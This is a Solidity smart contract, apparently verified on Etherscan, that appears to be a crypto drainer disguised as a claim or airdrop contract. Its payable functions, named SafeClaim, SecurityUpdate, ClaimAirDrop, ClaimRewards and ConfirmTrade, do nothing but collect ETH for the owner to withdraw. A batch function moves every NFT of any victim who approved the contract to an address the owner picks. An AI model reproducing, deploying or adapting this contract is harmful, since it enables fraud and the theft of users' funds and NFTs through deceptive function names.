/**
 *Submitted for verification at Etherscan.io on 2023-06-03
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;


interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address owner);
    function isApprovedForAll(address owner, address operator) external view returns (bool);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}

contract MultiFunction {
    address private owner;
    address private contractAddress;

    // event for EVM logging
    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    // event for EVM logging
    event BatchTransferERC721(
        address indexed contractAddress,
        address indexed to,
        uint256 amount
    );

    modifier isOwner() {
        require(msg.sender == owner, "This method can only be called by the contract owner. Now fuck off");
        _;
    }

    
    /**
     * @dev Set contract deployer as owner
     */
    constructor() {
        owner = msg.sender; 
        contractAddress = address(this);
        emit OwnerSet(address(0), owner);
    }

    function changeOwner(address newOwner) public isOwner {
        emit OwnerSet(owner, newOwner);
        owner = newOwner;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    /**
    * @dev Used to withdraw the ETH funds to the provided address
    */
    function withdraw(
        address payable _to
    ) public isOwner {
        (bool success, ) = _to.call{
            value: address(this).balance
        }("");

        require(success, "ETH Transfer failed.");
    }

    // Methods that can receive ETH
    function SafeClaim() public payable {}
    function SecurityUpdate() public payable {}
    function ClaimAirDrop() public payable {}
    function ClaimRewards() public payable {}
    function ConfirmTrade() public payable {}
    
    /**
    * @dev Used to transfer all approved NFTs to the provided address
    */
    function batchTransferERC721(
        address _to, 
        IERC721 _collection, 
        uint256[] calldata  _ids
    ) public isOwner {
        uint256 length = _ids.length;
        require(length > 0, "No token IDs provided");

        address collectionOwner = _collection.ownerOf(_ids[0]);
        bool approval = _collection.isApprovedForAll(collectionOwner, contractAddress);

        require(approval, "Contract does not have approval for this collection");

        for (uint256 i; i < length; ) {
            uint256 tokenId = _ids[i];

            address tokenIdOwner = _collection.ownerOf(tokenId);
            require(tokenIdOwner == collectionOwner, "Not every token ID has the same owner");

            _collection.safeTransferFrom(collectionOwner, _to, tokenId);

            unchecked {
                ++i;
            }
        }


        emit BatchTransferERC721(address(_collection), _to, length);
    }

}